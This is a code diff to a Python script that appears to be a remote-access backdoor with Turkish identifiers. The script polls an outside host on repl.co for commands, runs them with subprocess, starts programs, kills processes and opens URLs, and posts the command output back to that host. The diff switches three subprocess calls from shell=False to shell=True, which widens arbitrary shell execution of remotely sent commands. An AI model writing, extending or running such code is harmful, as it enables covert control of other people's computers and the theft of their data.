@@ -108,7 +108,7 @@ while True:
             req.post("https://musallat.zgretin.repl.co/musallat", data={"nm":f"{sbb}"})
 
         def asılkomut(komut):
-            sonuc = subprocess.run(komut.split(" "), shell=False, capture_output=True)
+            sonuc = subprocess.run(komut.split(" "), shell=True, capture_output=True)
             req.post("https://musallat.zgretin.repl.co/musallat", data={"nm": f"{sonuc.stdout.decode('utf-8', errors='backslashreplace')}"})
         data = {"nm":"nul"}
         while True:
@@ -144,13 +144,13 @@ while True:
                     wb.open(url)
 
                 elif r.text.startswith("run:"):
-                    sonuçç = subprocess.run(["start", r.text.replace("run:", "")], shell=False, capture_output=True)
+                    sonuçç = subprocess.run(["start", r.text.replace("run:", "")], shell=True, capture_output=True)
                     req.post("https://musallat.zgretin.repl.co/musallat",
                              data={"nm": f"{sonuçç.stdout.decode('utf-8', errors='backslashreplace')}"})
 
                 elif r.text.startswith("kapa:"):
                     komutt = r.text.replace("kapa:", "")
-                    sonuç = subprocess.run(["taskkill", "/im", komutt, "/f"], shell=False, capture_output=True)
+                    sonuç = subprocess.run(["taskkill", "/im", komutt, "/f"], shell=True, capture_output=True)
                     req.post("https://musallat.zgretin.repl.co/musallat",
                              data={"nm": f"{sonuç.stdout.decode('utf-8', errors='backslashreplace')}"})
 
